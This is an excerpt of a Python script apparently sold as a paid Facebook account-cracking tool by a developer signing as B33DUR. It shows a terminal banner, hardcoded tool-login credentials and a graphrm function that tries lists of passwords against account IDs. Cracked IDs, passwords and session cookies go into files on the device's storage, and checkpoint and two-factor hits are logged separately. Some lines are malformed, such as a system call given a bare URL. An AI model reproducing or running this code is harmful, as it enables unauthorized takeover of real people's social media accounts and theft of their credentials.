...
os.system('https://www.facebook.com/gojoXbeedur')
os.system('clear');os.system('espeak -a 300 "well,come to,, Bidur Paid tool love from Nepal"')
#------------------[ DATE ]-----------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
\x1b[10;93m╠══[DEVELOPER                   • \x1b[1;38m]B33DUR     ║ 
\x1b[10;91m╠══[WHATSAPP                  • +9779706868298]   ║    
\x1b[10;97m╠══[Github                   • GURUNGXWD12]   ║   
\x1b[10;94m╠══[Facebook                  • བི་དུར་གུ་རུང་། ]  ║ 
\x1b[10;95m╠══[TOOLS                    • PAID ]         ║    
\x1b[10;93m╠══[VERSION                  • 3.0. ]          ║ \x1b[10;92m
\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;31m'''
# Predefined username and password
correct_username = "B33DUR"
correct_password = "ROJ4NI"
...
def rmenu1():
    ...
    if '2' in rcd:print('                [10;92mAdmin Facebook idz');os.system('xdg-open https://www.facebook.com/gojoXbeedur');time.sleep(3)
...
def graphrm(id,psd,tid):
    ...
    for psw in psd:
        ...
        if 'session_key' in lo:
            ...
            print(f'''\r\r\x1b[10;92m[B33DUR • OK💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{tutulx(iid)}''')
            os.system('espeak -a 300 "Tutul,  Ok,  id"')
            ok.append(id)
            open('/sdcard/beedur-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
            if 'y' in cokix:
            ...
            if twfx in str(lo):
                ...
                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[B33DURl-2F] {iid} | {psw}{W}''')
                os.system('espeak -a 300 \"2F\"')
                open('/sdcard/Beedur-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                twf.append(id)
                break
            if 'www.facebook.com' in lo['error']['message']:
                ...
                if iid in ok:pass
                if 'y' in cpx:
                    print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[B33DUR-Cp] {iid} | {psw}{W}''')
                    cp.append(id)
                    os.system('espeak -a 300 "Cp"')
                    open('/sdcard/BEEDUR-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                break
            else:pass
    lop += 1
#------------------[ END-CALL ]-----------------#
